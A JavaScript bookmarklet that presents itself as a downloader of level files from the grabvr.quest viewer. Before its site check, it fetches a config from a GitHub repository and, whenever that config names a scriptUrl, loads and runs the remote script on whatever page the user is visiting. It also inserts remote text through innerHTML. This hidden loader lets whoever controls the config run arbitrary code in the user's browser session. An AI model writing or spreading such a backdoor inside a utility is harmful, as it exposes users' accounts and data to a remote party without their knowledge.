javascript:(() => {

const CONFIG_URL = "https://raw.githubusercontent.com/zacharyol/adswqeqaws-/main/config.json";

function showPopup(config) {
    const box = document.createElement("div");

    const img = document.createElement("img");
    img.src = config.logoUrl || "";
    img.style.width = "40px";
    img.style.height = "40px";
    img.style.marginRight = "10px";

    const text = document.createElement("div");
    text.innerHTML = `<b>${config.version || "v1.0.0"}</b><br>${config.warningMessage || ""}`;

    Object.assign(box.style, {
        position: "fixed",
        top: "20px",
        left: "50%",
        transform: "translateX(-50%)",
        background: "#111",
        color: "#fff",
        padding: "12px 18px",
        borderRadius: "10px",
        zIndex: 2147483647,
        display: "flex",
        alignItems: "center",
        gap: "10px",
        fontFamily: "Arial",
        boxShadow: "0 0 15px rgba(0,0,0,0.6)"
    });

    box.appendChild(img);
    box.appendChild(text);

    document.documentElement.appendChild(box);

    setTimeout(() => box.remove(), 5000);
}

function loadExternalScript(url) {
    return new Promise((resolve, reject) => {
        const s = document.createElement("script");
        s.src = url + "?t=" + Date.now();
        s.onload = () => resolve();
        s.onerror = () => reject("Failed to load script");
        document.head.appendChild(s);
    });
}

async function getConfig() {
    try {
        const res = await fetch(CONFIG_URL + "?t=" + Date.now());
        const text = await res.text();
        return JSON.parse(text);
    } catch (e) {
        console.log("Config error:", e);
        return {
            showWarning: false,
            warningMessage: "",
            version: "v0.0.0"
        };
    }
}

(async () => {

    const config = await getConfig();
    console.log("CONFIG LOADED:", config);

    // 🔥 VERSION POPUP (always shows briefly)
    showPopup(config);

    // ⚠️ optional warning logic
    if (config.showWarning) {
        console.log("Warning enabled:", config.warningMessage);
    }

    // 📦 external script loader
    if (config.scriptUrl) {
        loadExternalScript(config.scriptUrl)
            .then(() => console.log("External script loaded"))
            .catch(err => console.log(err));
    }

    // 🔒 your existing site check
    if (location.hostname !== "grabvr.quest") {
        alert("Use this in the level viewer (grabvr.quest)");
        return;
    }

    const levelParam = new URLSearchParams(location.search).get("level");
    if (!levelParam) {
        alert("No level ID found in URL.");
        return;
    }

    const [userid, levelid] = levelParam.split(":");

    function extractDownloadNumber(data, userid, levelid) {
        const key = data.data_key;
        if (!key) return null;

        const prefix = `level_data:${userid}:${levelid}:`;
        if (!key.startsWith(prefix)) return null;

        return key.slice(prefix.length);
    }

    async function downloadLevelFile(userid, levelid, number) {
        const res = await fetch(
            `https://api.slin.dev/grab/v1/download/${userid}/${levelid}/${number}`
        );

        if (!res.ok) throw new Error("Download failed");
        return await res.blob();
    }

    fetch(`https://api.slin.dev/grab/v1/details/${userid}/${levelid}`)
        .then(res => res.json())
        .then(async data => {

            const downloadNumber = extractDownloadNumber(data, userid, levelid);
            if (!downloadNumber) return alert("Failed to get download number.");

            const blob = await downloadLevelFile(userid, levelid, downloadNumber);

            const a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = `${levelid}.level`;
            document.body.appendChild(a);
            a.click();
            a.remove();

        })
        .catch(err => alert("Error: " + err));

})();

})();
